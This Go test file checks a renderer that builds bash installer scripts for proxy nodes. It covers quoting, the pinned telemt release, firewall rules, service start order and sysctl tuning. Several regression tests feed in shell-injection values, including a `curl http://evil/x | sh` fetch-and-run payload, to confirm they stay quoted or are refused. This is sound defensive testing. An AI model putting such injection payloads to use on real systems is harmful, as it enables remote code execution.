package nodeinstall

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"tgwebproxy/internal/domain"
)

func TestRenderContainsEssentials(t *testing.T) {
	out, err := Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	// Every substituted value is single-quoted by the sq template func, so the expectations
	// are on the quoted forms.
	for _, want := range []string{
		"#!/usr/bin/env bash", "'https://p.test/api/v1/install/tok/register'", "--hostname 'n.test'",
		"git -C", "checkout -q 'abc'", "init-node", "--max-profiles 128", "sha256sum -c", "tgwp-agent.service", "base64 -d | tar",
		"ACME_EMAIL='a@b.co'", "PANEL_URL='https://p.test'",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("script missing %q", want)
		}
	}
}

// TestRenderQuotesShellMetacharacters is the I2 regression test: a hostile value reaching a
// substitution point must stay inside its single quotes rather than becoming a command.
func TestRenderQuotesShellMetacharacters(t *testing.T) {
	out, err := Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test",
		ACMEEmail: `x"; curl http://evil/x | sh; #`,
		Secret:    "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `ACME_EMAIL='x"; curl http://evil/x | sh; #'`) {
		t.Errorf("payload not single-quoted:\n%s", out)
	}
	// A value containing a single quote must be closed/escaped/reopened, never left to
	// terminate the quoting.
	out, err = Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: `a'; id; '`,
		Secret: "0", TProxyCommit: "abc", AgentSHA256: "d", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `ACME_EMAIL='a'\''; id; '\'''`) {
		t.Errorf("single quote not escaped:\n%s", out)
	}
}

func TestFallbackSiteHasIndex(t *testing.T) {
	s := FallbackSite()
	if _, ok := s["index.html"]; !ok || len(s["styles.css"]) == 0 {
		t.Fatal("fallback site incomplete")
	}
}

func TestRenderRejectsMissingIndex(t *testing.T) {
	if _, err := Render(Params{Site: map[string][]byte{"a.css": nil}}); err == nil {
		t.Fatal("expected error")
	}
}

// telemtParams is a valid telemt node as handleInstallScript builds it.
func telemtParams() Params {
	return Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", AgentSHA256: "deadbeef", Site: FallbackSite(),
		Engine: domain.EngineTelemt, WebUser: "default", TLSDomain: "sni.test", ClassicPort: 8443,
		TelemtVersion: "3.5.5", TelemtSHA256: strings.Repeat("ab", 32),
	}
}

func TestRenderTelemtBranch(t *testing.T) {
	out, err := Render(telemtParams())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"#!/usr/bin/env bash",
		// The service account must exist before init-node chowns /etc/telemt to it.
		"useradd --system --home /var/lib/telemt --shell /usr/sbin/nologin telemt",
		// Pinned release, verified before anything is executed.
		"releases/download/$TELEMT_VERSION/telemt-x86_64-linux-gnu.tar.gz",
		"TELEMT_VERSION='3.5.5'",
		"TELEMT_SHA256='" + strings.Repeat("ab", 32) + "'",
		`echo "$TELEMT_SHA256  $TELEMT_TGZ" | sha256sum -c -`,
		"install -o root -g root -m 0755 \"$TELEMT_SRC\" /usr/local/bin/telemt",
		// init-node contract (Task 40): every value passed as one quoted word.
		`init-node --engine telemt --hostname "$NODE_HOSTNAME" --public-ip "$PUBLIC_IP"`,
		`--tls-domain "$TLS_DOMAIN" --classic-port "$CLASSIC_PORT" --web-user "$WEB_USER" --web-secret "$WEB_SECRET"`,
		`--site-dir "$SITE_DIR"`,
		"TLS_DOMAIN='sni.test'", "CLASSIC_PORT='8443'", "WEB_USER='default'",
		// Public IP detection and its IPv4 guard.
		"curl -4fsS https://api.ipify.org", "ip -4 route get 1.1.1.1",
		`if [[ ! "$PUBLIC_IP" =~ $IPV4_RE ]]`,
		`\"public_ip\":\"$PUBLIC_IP\"`,
		// Caddy in front of the loopback WEB listener; telemt serves the decoy itself.
		"reverse_proxy 127.0.0.1:18080 {", "header_up X-Forwarded-For {remote_host}",
		"trusted_proxies static private_ranges", "encode zstd gzip",
		// Firewall.
		"table inet tgwp_telemt", "tcp dport { 9090, 9091, 18080 } drop", "iif lo accept",
		// Agent env and start order.
		"TGWP_ENGINE=telemt", "systemctl enable --now telemt",
		// Readiness, not liveness: the agent's first apply must not race telemt's startup.
		"http://127.0.0.1:9091/v1/health/ready", `TELEMT_API_TOKEN="$(tr -d '\r\n' < /etc/telemt/api.token)"`,
		"journalctl -u telemt -n 30", "systemctl enable --now tgwp-agent",
		"systemctl restart caddy",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("telemt script missing %q", want)
		}
	}
	// Nothing from the tproxy stack may leak into the telemt branch.
	for _, unwanted := range []string{
		"install.sh --hostname", "tproxy-server", "mtproxy", "TPROXY_COMMIT", "file_server",
	} {
		if strings.Contains(out, unwanted) {
			t.Errorf("telemt script must not contain %q", unwanted)
		}
	}
	// Caddy must never serve the site: telemt's decoy answers valid and invalid requests alike.
	if strings.Contains(out, "root * ") {
		t.Error("telemt Caddyfile must not serve files itself")
	}
}

// I1: telemt learns the TLS fingerprint of its tls_domain from a real handshake on 443 at
// startup, and a runtime reload refuses to activate a generation whose TLS-front profile is
// still the built-in fallback. Caddy must therefore be up, with a certificate, before telemt
// starts - and the installer must fail loudly rather than exit 0 when it never gets one.
func TestRenderTelemtStartsCaddyBeforeTelemt(t *testing.T) {
	out, err := Render(telemtParams())
	if err != nil {
		t.Fatal(err)
	}
	caddy := strings.Index(out, "systemctl restart caddy")
	wait := strings.Index(out, `--resolve "$NODE_HOSTNAME:443:127.0.0.1"`)
	telemt := strings.Index(out, "systemctl enable --now telemt")
	agent := strings.Index(out, "systemctl enable --now tgwp-agent")
	if caddy < 0 || wait < 0 || telemt < 0 || agent < 0 {
		t.Fatalf("missing a step: caddy=%d wait=%d telemt=%d agent=%d", caddy, wait, telemt, agent)
	}
	if caddy >= wait || wait >= telemt || telemt >= agent {
		t.Fatalf("wrong order: caddy=%d wait=%d telemt=%d agent=%d", caddy, wait, telemt, agent)
	}
	for _, want := range []string{
		"Caddy did not serve https://$NODE_HOSTNAME/ with a valid certificate within 120s.",
		"journalctl -u caddy -n 30",
		"exit 1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("the Caddy wait must fail loudly, missing %q", want)
		}
	}
	// M7: the control-API token must not travel in the process argument list.
	if strings.Contains(out, `-H "Authorization: $TELEMT_API_TOKEN"`) {
		t.Error("the API token must be passed on stdin (-H @-), not as a curl argument")
	}
	if !strings.Contains(out, `-H @- http://127.0.0.1:9091/v1/health/ready <<<"Authorization: $TELEMT_API_TOKEN"`) {
		t.Error("expected the readiness probe to read its Authorization header from stdin")
	}
}

// TestRenderRefusesUnpinnedTelemt: the tarball is fetched over the network and executed as
// root, so an unset or malformed pin must fail in the panel, not on the node.
func TestRenderRefusesUnpinnedTelemt(t *testing.T) {
	for name, mutate := range map[string]func(*Params){
		"empty sha":     func(p *Params) { p.TelemtSHA256 = "" },
		"short sha":     func(p *Params) { p.TelemtSHA256 = "abcd" },
		"upper sha":     func(p *Params) { p.TelemtSHA256 = strings.ToUpper(strings.Repeat("ab", 32)) },
		"empty version": func(p *Params) { p.TelemtVersion = "" },
		"bad version":   func(p *Params) { p.TelemtVersion = "3.5.5; curl evil|sh" },
		"no web user":   func(p *Params) { p.WebUser = "" },
	} {
		p := telemtParams()
		mutate(&p)
		if _, err := Render(p); err == nil {
			t.Errorf("%s: expected refusal", name)
		}
	}
	// The tproxy branch does not need the telemt pin.
	p := telemtParams()
	p.Engine, p.TelemtSHA256, p.TelemtVersion, p.TProxyCommit = domain.EngineTProxy, "", "", "abc"
	if _, err := Render(p); err != nil {
		t.Fatalf("tproxy render must not need the telemt pin: %v", err)
	}
}

// TestRenderTelemtDefaults: nodes created before tls_domain/classic_port existed carry empty
// values; the script must still be a valid one.
func TestRenderTelemtDefaults(t *testing.T) {
	p := telemtParams()
	p.TLSDomain, p.ClassicPort = "", 0
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "TLS_DOMAIN='n.test'") || !strings.Contains(out, "CLASSIC_PORT='8443'") {
		t.Errorf("defaults not applied:\n%s", out)
	}
}

// TestRenderedScriptsAreValidBash runs `bash -n` over both branches: the script is piped
// straight into a root shell, so a syntax error is a broken install, not a test failure.
func TestRenderedScriptsAreValidBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	tproxy := Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	}
	for name, p := range map[string]Params{"tproxy": tproxy, "telemt": telemtParams()} {
		out, err := Render(p)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		path := filepath.Join(t.TempDir(), name+".sh")
		if err := os.WriteFile(path, []byte(out), 0o600); err != nil {
			t.Fatal(err)
		}
		if b, err := exec.Command(bash, "-n", path).CombinedOutput(); err != nil {
			t.Errorf("%s: bash -n failed: %v\n%s", name, err, b)
		}
	}
}

// Task 46b: the installer writes the MEKO network tuning to /etc/sysctl.d in both engine
// branches, right after the apt dependencies and before Caddy, and never lets a kernel that
// rejects a key (containers, old kernels) abort the install.
func TestRenderWritesSysctlTuning(t *testing.T) {
	tproxy := Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	}
	wantKeys := []string{
		"# TGProxy panel: network tuning for proxy nodes (adopted from MTPROTO_FIX_By_MEKO)",
		"net.core.default_qdisc = fq",
		"net.ipv4.tcp_congestion_control = bbr",
		"net.core.somaxconn = 65535",
		"net.ipv4.tcp_max_syn_backlog = 65535",
		"net.core.netdev_max_backlog = 65535",
		"net.ipv4.tcp_fastopen = 3",
		"net.ipv4.tcp_keepalive_time = 45",
		"net.ipv4.tcp_keepalive_intvl = 15",
		"net.ipv4.tcp_keepalive_probes = 3",
	}
	for name, p := range map[string]Params{"tproxy": tproxy, "telemt": telemtParams()} {
		out, err := Render(p)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		for _, want := range append([]string{
			"cat > /etc/sysctl.d/90-tgwp.conf <<'EOF'",
			"chmod 0644 /etc/sysctl.d/90-tgwp.conf",
			"modprobe tcp_bbr 2>/dev/null || true",
			`sysctl --system >/dev/null 2>&1 || echo "tgwp: some sysctl keys could not be applied (container or old kernel); continuing"`,
		}, wantKeys...) {
			if !strings.Contains(out, want) {
				t.Errorf("%s: script missing %q", name, want)
			}
		}
		// Order: after the apt dependencies, before anything Caddy-related.
		apt := strings.Index(out, "apt-get install -y --no-install-recommends")
		sysctl := strings.Index(out, "/etc/sysctl.d/90-tgwp.conf")
		caddy := strings.Index(out, "caddy")
		if name == "tproxy" {
			caddy = strings.Index(out, "git clone")
		}
		if apt < 0 || sysctl < 0 || caddy < 0 || apt >= sysctl || sysctl >= caddy {
			t.Errorf("%s: wrong order apt=%d sysctl=%d next=%d", name, apt, sysctl, caddy)
		}
		// The heredoc is quoted ('EOF') and contains no interpolation at all.
		start := strings.Index(out, "cat > /etc/sysctl.d/90-tgwp.conf <<'EOF'")
		end := strings.Index(out[start:], "\nEOF\n")
		if end < 0 {
			t.Fatalf("%s: sysctl heredoc not terminated", name)
		}
		if body := out[start:][:end]; strings.Contains(body, "$") || strings.Contains(body, "`") {
			t.Errorf("%s: sysctl heredoc must not interpolate anything:\n%s", name, body)
		}
	}
	// The branch can be switched off without touching the template.
	p := telemtParams()
	p.NoSysctlTuning = true
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "90-tgwp.conf") || strings.Contains(out, "tcp_bbr") {
		t.Error("NoSysctlTuning must drop the sysctl block")
	}
}
